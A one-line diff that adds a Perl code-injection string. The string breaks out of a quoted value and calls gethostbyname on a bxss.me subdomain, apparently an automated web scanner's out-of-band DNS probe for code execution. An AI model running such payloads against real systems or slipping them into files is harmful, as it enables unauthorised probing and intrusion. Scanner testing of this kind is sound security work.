@@ -1,0 +1,1 @@
+'.gethostbyname(lc('hittk'.'jmekskrkb8ea0.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(116).chr(89).chr(122).chr(65).'
